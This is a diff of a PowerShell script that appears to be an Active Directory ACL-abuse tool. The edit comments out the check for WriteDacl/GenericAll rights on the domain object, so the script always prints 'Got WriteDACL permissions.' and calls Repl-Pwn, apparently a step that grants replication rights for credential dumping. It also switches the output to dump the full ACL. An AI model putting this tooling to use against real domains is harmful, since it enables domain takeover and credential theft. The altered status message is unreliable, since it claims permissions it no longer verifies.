@@ -1739,26 +1739,26 @@ $domainObjectTypeName = "domains" # dunno if typo?
 $domainACL       = $ACL | Where-Object {$_.ObjectType -eq $domainObjectTypeName}
 $writeDACLDomain = $domainACL | Where-Object {$_.ActiveDirectoryRights -eq 'WriteDacl'}
 $writeDACLDomain += $domainACL | Where-Object {$_.ActiveDirectoryRights -eq 'GenericAll'}
-Write-Output $writeDACLDomain
+Write-Output $ACL
 Write-Output $groupMembership
 
 # Arrays with permissions
 $currWriteDaclPerm = @()
 
 # Check if we have writeDACL permissions
-foreach ($g in $groupMembership){
-    $currWriteDaclPerm += $writeDACLDomain | Where-Object {$_.PrincipalName.ToString().ToLower() -like "$($g.NTAccount.ToLower())*"}
-}
+#foreach ($g in $groupMembership){
+#    $currWriteDaclPerm += $writeDACLDomain | Where-Object {$_.PrincipalName.ToString().ToLower() -like "$($g.NTAccount.ToLower())*"}
+#}
 
-if ($currWriteDaclPerm.Count -ge 1) {
-    Write-Good 'Got WriteDACL permissions.'
+#if ($currWriteDaclPerm.Count -ge 1) {
+Write-Good 'Got WriteDACL permissions.'
 
-    Repl-Pwn
+Repl-Pwn
 
-    # Done.
-    Invoke-Cleanup
-    return
-}
+# Done.
+Invoke-Cleanup
+return
+#}
 
 # with these permissions we can possibly pwn via another way
 #$PwnPermissions = @('GenericAll','WriteProperty','owner','WriteOwner')
